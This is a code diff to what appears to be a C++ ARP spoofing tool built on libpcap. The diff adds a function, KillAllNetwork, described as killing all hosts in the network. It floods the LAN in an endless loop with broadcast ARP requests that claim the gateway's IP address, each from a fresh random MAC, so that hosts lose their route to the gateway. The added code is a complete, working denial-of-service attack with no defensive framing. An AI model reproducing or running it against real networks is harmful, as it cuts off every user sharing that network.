@@ -95,6 +95,8 @@ void RecoverArpTables(const char* deviceName_, Mac MyMac_,
 
 void SigintHandler(int SIGNUM_);
 
+void KillAllNetwork(const char* deviceName_, Ip gatewayIp_);
+
 
 int main(int argc, char* argv[]) {
 	if (argc < 4 || argc % 2 != 0) {
@@ -609,5 +611,55 @@ void RecoverArpTables(const char* deviceName_, Mac MyMac_,
 void SigintHandler(int SIGNUM_){
 	printf("\nSIGINT captured, joining threads...\n");
 	g_SIGINT_flag = true;
+	return;
+}
+
+
+/**
+ * @brief Kill all hosts in network.
+ * 
+ * @param[in] deviceName_ NIC device name.
+ * @param[in] gatewayIp_ gateway Ip object.
+ */
+void KillAllNetwork(const char* deviceName_, Ip gatewayIp_){
+	char errbuf[PCAP_ERRBUF_SIZE];
+	pcap_t* handle = pcap_open_live(deviceName_, BUFSIZ, 1, 1, errbuf);
+	if (handle == nullptr) {
+		fprintf(stderr, "pcap_open_live error=%s\n", pcap_geterr(handle));
+		return;
+	}
+
+	Mac radomMac = Mac().randomMac();
+	
+	// generate killing packet.
+	EthArpPacket pkt;
+	pkt.eth_.smac_ = radomMac;
+	pkt.eth_.dmac_ = Mac().broadcastMac();
+	pkt.eth_.type_ = htons(EthHdr::Arp);
+	pkt.arp_.hrd_ = htons(ArpHdr::ETHER);
+	pkt.arp_.pro_ = htons(EthHdr::Ip4);
+	pkt.arp_.hln_ = Mac::SIZE;
+	pkt.arp_.pln_ = Ip::SIZE;
+	pkt.arp_.op_ = htons(ArpHdr::Request);
+	pkt.arp_.smac_ = radomMac;
+	pkt.arp_.sip_ = htonl(gatewayIp_);
+	pkt.arp_.tmac_ = Mac().nullMac();
+	pkt.arp_.tip_ = htonl(Ip("0.0.0.0"));
+	
+	int res = 0;
+	while (true)
+	{
+		res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&pkt), sizeof(EthArpPacket));
+		if (res != 0) {
+			fprintf(stderr, "pcap_sendpacket error=%s\n", pcap_geterr(handle));
+			pcap_close(handle);
+			return;
+		}
+
+		radomMac = Mac().randomMac();
+		pkt.eth_.smac_ = radomMac;
+		pkt.arp_.smac_ = radomMac;
+	}
+	pcap_close(handle);
 	return;
 }
